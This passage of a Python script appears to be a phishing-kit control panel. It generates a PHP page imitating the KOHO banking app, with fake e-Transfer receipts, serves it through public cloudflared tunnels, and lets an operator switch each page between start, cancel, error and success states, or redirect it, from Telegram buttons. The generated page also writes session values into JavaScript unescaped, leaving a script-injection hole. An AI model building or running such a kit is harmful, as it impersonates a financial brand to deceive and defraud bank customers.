                                        <p class="card-text">Add, edit, or remove users from the application.</p>
                                        <button class="btn btn-light" data-bs-toggle="modal" data-bs-target="#manageUsersModal"><i class="fas fa-users-cog me-2"></i> Manage Users</button>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 col-sm-12 mb-3">
                                <div class="card text-white bg-secondary">
                                    <div class="card-header">
                                        Application Settings
                                    </div>
                                    <div class="card-body">
                                        <h5 class="card-title">Settings</h5>
                                        <p class="card-text">Update application settings to customize your experience.</p>
                                        <button class="btn btn-light" data-bs-toggle="modal" data-bs-target="#appSettingsModalAdmin"><i class="fas fa-sliders-h me-2"></i> Settings</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                <?php } ?>
            <?php } ?>
        </div>

        <!-- Centralized Alert Modal -->
        <div class="modal fade" id="alertModal" tabindex="-1" aria-labelledby="alertModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content text-bg-dark">
                    <div class="modal-header">
                        <h5 id="alertModalLabel" class="modal-title">Alert</h5>
                        <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div id="alertModalBody" class="modal-body">
                        <!-- Dynamic Content -->
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- View Logs Modal -->
        <div class="modal fade" id="viewLogsModal" tabindex="-1" aria-labelledby="viewLogsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 id="viewLogsModalLabel" class="modal-title">Application Logs</h5>
                        <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <?php
                            // Display logs (for demonstration, using a static array)
                            $logs = [
                                ['timestamp' => '2024-04-01 10:00:00', 'action' => 'User Login', 'user' => 'user'],
                                ['timestamp' => '2024-04-02 12:30:00', 'action' => 'e-Transfer Sent', 'user' => 'user'],
                                ['timestamp' => '2024-04-03 09:15:00', 'action' => 'Contact Added', 'user' => 'user'],
                                // Add more logs as needed...
                            ];
                        ?>
                        <div class="table-responsive">
                            <table class="table table-striped table-dark">
                                <thead>
                                    <tr>
                                        <th>Timestamp</th>
                                        <th>Action</th>
                                        <th>User</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($logs as $log) { ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($log['timestamp']); ?></td>
                                            <td><?php echo htmlspecialchars($log['action']); ?></td>
                                            <td><?php echo htmlspecialchars($log['user']); ?></td>
                                        </tr>
                                    <?php } ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Manage Users Modal -->
        <div class="modal fade" id="manageUsersModal" tabindex="-1" aria-labelledby="manageUsersModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="manageUsersModalLabel">Manage Users</h5>
                        <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <!-- Add User Button -->
                        <button class="btn btn-success mb-3" data-bs-toggle="modal" data-bs-target="#addUserModal"><i class="fas fa-user-plus me-2"></i> Add User</button>
                        <!-- Users List -->
                        <?php if (empty($_SESSION['users'])) { ?>
                            <p>No users found.</p>
                        <?php } else { ?>
                            <div class="table-responsive">
                                <table class="table table-bordered table-dark">
                                    <thead>
                                        <tr>
                                            <th>Username</th>
                                            <th>Role</th>
                                            <th>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($_SESSION['users'] as $user) { ?>
                                            <tr>
                                                <td><?php echo htmlspecialchars($user['username']); ?></td>
                                                <td><?php echo htmlspecialchars($user['role']); ?></td>
                                                <td>
                                                    <!-- Edit User Button -->
                                                    <button class="btn btn-primary btn-sm me-2" data-bs-toggle="modal" data-bs-target="#editUserModal<?php echo htmlspecialchars($user['id']); ?>">
                                                        <i class="fas fa-edit me-1"></i> Edit
                                                    </button>

                                                    <!-- Delete User Button -->
                                                    <form method="POST" action="index.php" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this user?');">
                                                        <input type="hidden" name="deleteUserForm" value="1">
                                                        <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($user['id']); ?>">
                                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                        <button type="submit" class="btn btn-danger btn-sm"><i class="fas fa-trash-alt me-1"></i> Delete</button>
                                                    </form>

                                                    <!-- Edit User Modal -->
                                                    <div class="modal fade" id="editUserModal<?php echo htmlspecialchars($user['id']); ?>" tabindex="-1" aria-labelledby="editUserModalLabel<?php echo htmlspecialchars($user['id']); ?>" aria-hidden="true">
                                                        <div class="modal-dialog">
                                                            <div class="modal-content">
                                                                <form method="POST" action="index.php">
                                                                    <div class="modal-header">
                                                                        <h5 class="modal-title" id="editUserModalLabel<?php echo htmlspecialchars($user['id']); ?>">Edit User</h5>
                                                                        <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                                                                    </div>
                                                                    <div class="modal-body">
                                                                        <input type="hidden" name="updateUserForm" value="1">
                                                                        <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($user['id']); ?>">
                                                                        <div class="mb-3">
                                                                            <label for="editUsername<?php echo htmlspecialchars($user['id']); ?>" class="form-label">Username</label>
                                                                            <input type="text" class="form-control bg-dark text-light" id="editUsername<?php echo htmlspecialchars($user['id']); ?>" name="username" value="<?php echo htmlspecialchars($user['username']); ?>" required>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editRole<?php echo htmlspecialchars($user['id']); ?>" class="form-label">Role</label>
                                                                            <select class="form-select bg-dark text-light" id="editRole<?php echo htmlspecialchars($user['id']); ?>" name="role" required>
                                                                                <option value="user" <?php echo ($user['role'] === 'user') ? 'selected' : ''; ?>>User</option>
                                                                                <option value="admin" <?php echo ($user['role'] === 'admin') ? 'selected' : ''; ?>>Admin</option>
                                                                            </select>
                                                                        </div>
                                                                        <div class="mb-3">
                                                                            <label for="editPassword<?php echo htmlspecialchars($user['id']); ?>" class="form-label">Password</label>
                                                                            <input type="password" class="form-control bg-dark text-light" id="editPassword<?php echo htmlspecialchars($user['id']); ?>" name="password" placeholder="Leave blank to keep current password">
                                                                        </div>
                                                                    </div>
                                                                    <div class="modal-footer">
                                                                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                                        <button type="submit" class="btn btn-primary">Save Changes</button>
                                                                    </div>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                        <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        <?php } ?>
                    </div>
                </div>
            </div>

            <!-- Application Settings Modal (Admin) -->
            <div class="modal fade" id="appSettingsModalAdmin" tabindex="-1" aria-labelledby="appSettingsModalAdminLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <form method="POST" action="index.php">
                            <div class="modal-header">
                                <h5 class="modal-title" id="appSettingsModalAdminLabel">Application Settings</h5>
                                <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <input type="hidden" name="updateAppSettingsForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="appNameAdmin" class="form-label">Application Name</label>
                                    <input type="text" class="form-control bg-dark text-light" id="appNameAdmin" name="app_name" value="<?php echo htmlspecialchars($_SESSION['senderName'] ?? 'KOHO'); ?>" required>
                                </div>
                                <div class="mb-3">
                                    <label for="appVersionAdmin" class="form-label">Version</label>
                                    <input type="text" class="form-control bg-dark text-light" id="appVersionAdmin" name="version" value="1.0.0" required>
                                </div>
                                <div class="mb-3">
                                    <label for="appDeveloperAdmin" class="form-label">Developer</label>
                                    <input type="text" class="form-control bg-dark text-light" id="appDeveloperAdmin" name="developer" value="Your Name" required>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="submit" class="btn btn-primary">Update Settings</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <!-- Add User Modal -->
            <div class="modal fade" id="addUserModal" tabindex="-1" aria-labelledby="addUserModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <form method="POST" action="index.php">
                            <div class="modal-header">
                                <h5 class="modal-title" id="addUserModalLabel">Add New User</h5>
                                <button type="button" class="btn-close btn-close-white text-reset" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <input type="hidden" name="addUserForm" value="1">
                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                <div class="mb-3">
                                    <label for="newUsername" class="form-label">Username</label>
                                    <input type="text" class="form-control bg-dark text-light" id="newUsername" name="username" required>
                                </div>
                                <div class="mb-3">
                                    <label for="newRole" class="form-label">Role</label>
                                    <select class="form-select bg-dark text-light" id="newRole" name="role" required>
                                        <option value="user">User</option>
                                        <option value="admin">Admin</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="newPassword" class="form-label">Password</label>
                                    <input type="password" class="form-control bg-dark text-light" id="newPassword" name="password" required>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="submit" class="btn btn-primary">Add User</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        <?php } ?>
    </div>

    <!-- Footer -->
    <footer class="text-center py-3">
        &copy; <?php echo date('Y'); ?> KOHO. All rights reserved.
    </footer>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- FontAwesome for Icons -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <!-- External JS -->
    <script src="assets/js/main.js"></script>

    <!-- Initialize Modals and Display Messages -->
    <?php if (isset($_SESSION['modal'])): ?>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                showModal('<?php echo $_SESSION['modal']['title']; ?>', '<?php echo $_SESSION['modal']['message']; ?>', '<?php echo $_SESSION['modal']['type']; ?>');
            });
        </script>
        <?php unset($_SESSION['modal']); ?>
    <?php endif; ?>

    <?php if (isset($_SESSION['etransferReceipt'])): ?>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                showEtransferReceipt(<?php echo json_encode($_SESSION['etransferReceipt']); ?>);
            });
        </script>
        <?php unset($_SESSION['etransferReceipt']); ?>
    <?php endif; ?>
</body>
</html>
"""
    else:
        # Create a redirect index.php based on action
        redirect_url = REDIRECT_URLS.get(action, 'https://example.com')
        index_php_content = f"""<?php
header("Location: '{redirect_url}'");
exit();
?>"""

    with open(index_php_path, 'w') as f:
        f.write(index_php_content)

    return base_dir

# -------------------- Utility Functions --------------------
def check_executable(path, name):
    if not os.path.isfile(path):
        print(f"Error: {name} not found at {path}. Please ensure it is installed correctly.")
        exit(1)

def kill_processes():
    processes = ["php", "cloudflared"]
    for process in processes:
        try:
            subprocess.call(f'taskkill /F /IM {process}.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"Failed to kill {process}: {e}")

def start_php_server(port, base_dir):
    try:
        subprocess.Popen(['php', '-S', f"{HOST}:{port}", '-t', base_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"PHP server started on port {port}.")
    except Exception as e:
        print(f"Failed to start PHP server on port {port}: {e}")

def start_cloudflared(port):
    log_path = os.path.join(BASE_DIR, '.server', f'cloudflared_output_{port}.log')
    try:
        with open(log_path, 'w') as log_file:
            subprocess.Popen(
                [CLOUDFLARED_PATH, 'tunnel', '--url', f"http://{HOST}:{port}"],
                stdout=log_file,
                stderr=log_file,
                text=True
            )
        time.sleep(8)  # Wait for cloudflared to establish the tunnel
        return extract_cloudflare_url(log_path)
    except Exception as e:
        print(f"Error starting cloudflared on port {port}: {e}")
        return None

def extract_cloudflare_url(log_path):
    try:
        with open(log_path, 'r') as file:
            content = file.read()
            match = re.search(r'https://[-\w]*\.trycloudflare\.com', content)
            if match:
                return match.group(0)
    except Exception as e:
        print(f"Error reading log file {log_path}: {e}")
    return None

# -------------------- Server Management --------------------
def start_server_with_buttons(server_num, port, chat_id):
    base_dir = create_webroot(server_num, 'start')

    # Check if cloudflared.exe exists
    check_executable(CLOUDFLARED_PATH, "cloudflared.exe")

    # Check if PHP is accessible
    try:
        subprocess.run(['php', '-v'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("Error: PHP is not installed or not added to PATH.")
        bot.send_message(chat_id, "Error: PHP is not installed or not added to PATH.")
        return

    start_php_server(port, base_dir)
    url = start_cloudflared(port)

    if url:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("Start", callback_data=f'start_{server_num}'),
            InlineKeyboardButton("Cancel", callback_data=f'cancel_{server_num}'),
            InlineKeyboardButton("Error", callback_data=f'error_{server_num}'),
            InlineKeyboardButton("Good", callback_data=f'good_{server_num}')
        )
        bot.send_message(chat_id, f"🔗 **Server {server_num}**\n🌐 URL: {url}", parse_mode='Markdown', reply_markup=markup)
    else:
        bot.send_message(chat_id, f"❌ Failed to start Server {server_num} or fetch URL.")

def start_servers_callback(chat_id):
    for i in range(NUM_SERVERS):
        port = PHP_PORT_START + i
        server_num = i + 1
        start_server_with_buttons(server_num, port, chat_id)

# -------------------- Telegram Bot Handlers --------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🔄 Initializing servers and generating controls...")
    threading.Thread(target=start_servers_callback, args=(message.chat.id,), daemon=True).start()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    data = call.data.split('_')
    action = data[0]
    server_num = int(data[1]) if len(data) > 1 else None
    port = PHP_PORT_START + (server_num - 1) if server_num else None
    server_dir_name = f'server{server_num}' if server_num else None

    if action in ['start', 'cancel', 'error', 'good'] and server_num:
        # Kill existing PHP and cloudflared processes for this server
        kill_processes()

        # Update the webroot based on action
        create_webroot(server_num, action)

        # Restart the PHP server with the new webroot
        start_php_server(port, os.path.join(BASE_DIR, f'server{server_num}'))

        # Start cloudflared and get the new URL
        url = start_cloudflared(port)

        if url:
            # Update the message with the new URL
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("Start", callback_data=f'start_{server_num}'),
                InlineKeyboardButton("Cancel", callback_data=f'cancel_{server_num}'),
                InlineKeyboardButton("Error", callback_data=f'error_{server_num}'),
                InlineKeyboardButton("Good", callback_data=f'good_{server_num}')
            )
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔗 **Server {server_num}**\n🌐 URL: {url}",
                parse_mode='Markdown',
                reply_markup=markup
            )
            bot.answer_callback_query(call.id, f"✅ Server {server_num} set to '{action}' state.")
        else:
            bot.answer_callback_query(call.id, f"❌ Failed to set Server {server_num} to '{action}' state.")
    else:
        bot.answer_callback_query(call.id, "⚠️ Unknown action.")

# -------------------- Entry Point --------------------
if __name__ == '__main__':
    setup_directories()
    print("✅ Bot is running. Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
